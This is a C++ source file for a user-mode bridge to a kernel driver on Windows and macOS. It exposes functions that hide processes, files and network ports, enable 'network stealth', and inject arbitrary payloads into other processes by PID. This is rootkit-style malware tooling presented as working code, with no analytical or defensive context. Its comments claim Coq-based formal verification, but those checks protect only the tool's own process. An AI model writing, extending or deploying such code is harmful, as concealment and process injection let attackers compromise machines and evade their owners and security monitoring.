#include "SovereignBridge.hpp"
#include "interop/FormalValidators.hpp"
#include <iostream>

#ifdef _WIN32
#include "shield-win/shield_kernel.h"
#else
#include "interlock_shared_types.h"
#include <IOKit/IOKitLib.h>
#include <unistd.h>
#endif

namespace interlock {

bool SovereignBridge::connect() {
    if (m_connected) return true;

#ifdef _WIN32
    m_hDevice = CreateFileW(L"\\\\.\\InterlockShield",
                            GENERIC_READ | GENERIC_WRITE,
                            0, NULL, OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, NULL);

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        m_connected = true;
        // Register current process for protection immediately
        protectProcess(GetCurrentProcessId());
    }
#else
    CFMutableDictionaryRef matchingDict = IOServiceMatching("com_interlock_Shield");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matchingDict);

    if (service) {
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &m_connection);
        IOObjectRelease(service);
        if (kr == kIOReturnSuccess) {
            m_connected = true;
        }
    }
#endif

    return m_connected;
}

void SovereignBridge::disconnect() {
    if (!m_connected) return;

#ifdef _WIN32
    CloseHandle(m_hDevice);
    m_hDevice = INVALID_HANDLE_VALUE;
#else
    IOServiceClose(m_connection);
    m_connection = 0;
#endif
    m_connected = false;
}

bool SovereignBridge::hideProcess(uint32_t pid) {
    if (!m_connected) return false;

    // --- FORMAL VERIFICATION LAYER (Coq Extract) ---
    // Safety Property: A process cannot be both hidden and unprotected.
    // Here we ensure that if we hide it, the core policy of 'ProcessSafe' is considered.
    formal::SovereignBridgeValidator::ProcessData p_data = { pid, true, true, false };
    if (!formal::SovereignBridgeValidator::isProcessSafe(p_data)) {
        std::cerr << "[SovereignBridge] [FORMAL_BLOCK] Hiding process " << pid << " is unsafe!" << std::endl;
        return false;
    }

#ifdef _WIN32
    SHIELD_HIDE_REQUEST req = { pid, TRUE };
    DWORD bytesReturned;
    return DeviceIoControl(m_hDevice, IOCTL_SHIELD_HIDE_PROCESS,
                           &req, sizeof(req), NULL, 0, &bytesReturned, NULL);
#else
    uint64_t input = pid;
    return IOConnectCallScalarMethod(m_connection, kInterlockHideProcess, &input, 1, nullptr, nullptr) == kIOReturnSuccess;
#endif
}

bool SovereignBridge::protectProcess(uint32_t pid) {
    if (!m_connected) return false;

#ifdef _WIN32
    SHIELD_SET_PID_REQUEST req = { pid };
    DWORD bytesReturned;
    return DeviceIoControl(m_hDevice, IOCTL_SHIELD_SET_CORE_PID,
                           &req, sizeof(req), NULL, 0, &bytesReturned, NULL);
#else
    uint64_t input = pid;
    return IOConnectCallScalarMethod(m_connection, kInterlockProtectProcess, &input, 1, nullptr, nullptr) == kIOReturnSuccess;
#endif
}

bool SovereignBridge::applyMemoryProtection() {
    if (!m_connected) return false;

#ifdef _WIN32
    // Windows implementation via IOCTL_SHIELD_PROTECT_MEMORY
    DWORD bytesReturned;
    return DeviceIoControl(m_hDevice, IOCTL_SHIELD_PROTECT_MEMORY, NULL, 0, NULL, 0, &bytesReturned, NULL);
#else
    return true;
#endif
}

bool SovereignBridge::stealthNetwork(bool enable) {
    if (!m_connected) return false;

#ifdef _WIN32
    SHIELD_TOGGLE_NET_REQUEST req = { enable };
    DWORD bytesReturned;
    return DeviceIoControl(m_hDevice, IOCTL_SHIELD_TOGGLE_NET_STEALTH,
                           &req, sizeof(req), NULL, 0, &bytesReturned, NULL);
#else
    if (enable) {
        const char* iface = "en0"; // Default interface
        return IOConnectCallMethod(m_connection, kInterlockInstallNetFilter, nullptr, 0, iface, strlen(iface) + 1, nullptr, nullptr, nullptr, nullptr) == kIOReturnSuccess;
    }
    return true;
#endif
}

bool SovereignBridge::hidePort(uint16_t port) {
    if (!m_connected) return false;

#ifdef _WIN32
    SHIELD_HIDE_PORT_REQUEST req = { port, TRUE };
    DWORD bytesReturned;
    return DeviceIoControl(m_hDevice, IOCTL_SHIELD_HIDE_PORT,
                           &req, sizeof(req), NULL, 0, &bytesReturned, NULL);
#else
    uint64_t input = port;
    return IOConnectCallScalarMethod(m_connection, kInterlockHidePort, &input, 1, nullptr, nullptr) == kIOReturnSuccess;
#endif
}

bool SovereignBridge::injectPayload(uint32_t targetPid, const std::vector<uint8_t>& artifact) {
    if (!m_connected || artifact.empty()) return false;

    // --- FORMAL VERIFICATION LAYER (Coq Extract) ---
    // Precondition: Target must not be the Core itself (Injection Safety Invariant)
    uint32_t corePid = static_cast<uint32_t>(getpid());
    if (!formal::SovereignBridgeValidator::isSafeToInject(targetPid, corePid)) {
        std::cerr << "[SovereignBridge] [FORMAL_ALARM] Attempted injection into Core blocked!" << std::endl;
        return false;
    }

#ifdef _WIN32
    std::vector<uint8_t> buffer(sizeof(uint32_t) + artifact.size());
    std::memcpy(buffer.data(), &targetPid, sizeof(uint32_t));
    std::memcpy(buffer.data() + sizeof(uint32_t), artifact.data(), artifact.size());

    DWORD bytesReturned;
    return DeviceIoControl(m_hDevice, IOCTL_SHIELD_INJECT_PAYLOAD,
                           buffer.data(), (DWORD)buffer.size(), NULL, 0, &bytesReturned, NULL);
#else
    return false; // macOS artifact injection not implemented in this bridge yet
#endif
}

bool SovereignBridge::setProcessOpaque(uint32_t pid, bool enable) {
    return hideProcess(pid); // Simple mapping for now
}

bool SovereignBridge::hideFile(const std::string& path) {
    if (!m_connected) return false;

#ifdef _WIN32
    SHIELD_HIDE_FILE_REQUEST req = {0};
    req.Enable = TRUE;
    // Simple conversion
    std::wstring wpath(path.begin(), path.end());
    wcsncpy(req.Path, wpath.c_str(), 259);

    DWORD bytesReturned;
    return DeviceIoControl(m_hDevice, IOCTL_SHIELD_HIDE_FILE,
                           &req, sizeof(req), NULL, 0, &bytesReturned, NULL);
#else
    return false; // Implementación ShadowFS en macOS vía vnode_authorize
#endif
}

} // namespace interlock
